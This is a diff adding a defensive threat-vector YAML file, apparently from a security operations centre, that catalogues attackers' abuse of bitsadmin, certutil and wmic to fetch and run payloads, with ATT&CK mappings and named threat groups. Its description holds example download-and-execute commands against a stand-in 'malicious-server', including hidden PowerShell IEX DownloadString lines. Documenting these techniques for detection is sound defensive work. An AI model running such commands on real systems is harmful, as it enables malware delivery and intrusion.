@@ -1,0 +1,105 @@
+name: Download and Execute Payloads with Windows Utilities
+criticality: Medium
+#references:
+  #public:
+    #1: 
+  #internal:
+    #a: 
+  #reports:
+    #-
+
+metadata:
+  uuid: 765be5d9-4f79-4e3d-b894-fa428f285ab5
+  schema: tvm::2.0
+  version: 1
+  created: 2024-11-05
+  modified: 2024-11-05
+  tlp: clear
+  organisation:
+    uuid: 56b0a0f0-b0bc-47d9-bb46-02f80ae2065a
+    name: EC DIGIT CSOC
+
+threat:
+  actors:
+    - name: att&ck::G0046 #[Enterprise] FIN7, Carbon Spider, ELBRUS, GOLD NIAGARA, ITG14, Sangria Tempest
+    - name: misp::00220228-a5a4-4032-a30d-826bb55aa3fb #FIN7, CARBON SPIDER, GOLD NIAGARA, Calcium, ATK32, G0046, G0008, Coreid, Carbanak, Sangria Tempest, ELBRUS, Carbon Spider, JokerStash
+    - name: att&ck::G0010 #[Enterprise] Turla, BELUGASTURGEON, Group 88, IRON HUNTER, Krypton, Secret Blizzard, Snake, Venomous Bear, Waterbug, WhiteBear
+    - name: misp::fa80877c-f509-4daf-8b62-20aba1635f68 #Turla, Snake, VENOMOUS Bear, Group 88, Waterbug, WRAITH, Uroburos, Pfinet, TAG_0530, KRYPTON, Hippo Team, Pacifier APT, Popeye, SIG23, IRON HUNTER, MAKERSMARK, ATK13, G0010, ITG12, Blue Python, SUMMIT, UNC4210, Secret Blizzard, UAC-0144, UAC-0024, UAC-0003
+    - name: att&ck::G0016 #[Enterprise] APT29, Blue Kitsune, Cozy Bear, CozyDuke, Dark Halo, IRON HEMLOCK, IRON RITUAL, Midnight Blizzard, NOBELIUM, NobleBaron, SolarStorm, The Dukes, UNC2452, UNC3524, YTTRIUM
+    - name: misp::2ee5ed7a-c4d0-40be-a837-20817474a15b #UNC2452, DarkHalo, StellarParticle, NOBELIUM, Solar Phoenix, Midnight Blizzard
+  killchain: Execution
+  att&ck:
+    - T1105 #Ingress Tool Transfer
+    - T1218 #System Binary Proxy Execution
+  chaining:
+    - relation: atomicity::implements
+      vector: d5039f2c-9fcc-4ba3-ad6a-da8c891ba745
+      description: |
+        This TVM is implementing the bigger TVM : Abuse of Windows Utilities
+  #cve:
+    #-
+  #misp:
+    #-
+  domains:
+    - Enterprise
+  terrain: |
+    Adversary has access to a Windows system where native utilities are available 
+    and can execute commands without restrictions.
+  targets:
+    - Workstations
+    - Public-Facing Servers
+    - Laptop
+    - Virtual Machines
+  platforms:
+    - Windows
+    - PowerShell
+  severity: Significant incident
+  leverage:
+    - Elevation of privilege
+    - Software installation
+    - Information Disclosure
+    - Modify configuration
+  impact:
+    - Data Breach
+    - Reputational Damages
+    - Business disruption
+  viability: Likely
+  description: |
+    1. Bitsadmin.exe\
+    **Description**: A command-line tool to create and manage BITS jobs. 
+    Threat actors use it to download or upload files stealthily.
+
+    Example:
+
+    ```
+    bitsadmin.exe /transfer myJob /download /priority high http://malicious-server/payload.exe C:\temp\payload.exe
+    start C:\temp\payload.exe
+    ```
+
+    2. Certutil.exe\
+    **Description**: A command-line tool for manipulating certificates. 
+    It can be used to download files and perform Base64 encoding/decoding.
+
+    Example:
+
+    ```
+    certutil.exe -urlcache -split -f http://malicious-server/payload.exe C:\temp\payload.exe
+    ```
+
+    3. Wmic.exe\
+    **Description**: Windows Management Instrumentation Command-line (WMIC) is 
+    a command-line utility that provides a powerful interface to the 
+    Windows Management Instrumentation (WMI) infrastructure. 
+    It allows administrators to perform management tasks on both local and remote Windows systems
+
+    Example:
+
+    Execute payload on a local machine:
+    ```
+    wmic process call create "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-server/payload.ps1')\""
+    ```
+
+    Execute a remote script:
+    ```
+    wmic /node:"REMOTE_COMPUTER_NAME" process call create "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://malicious-server/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\""
+    ```
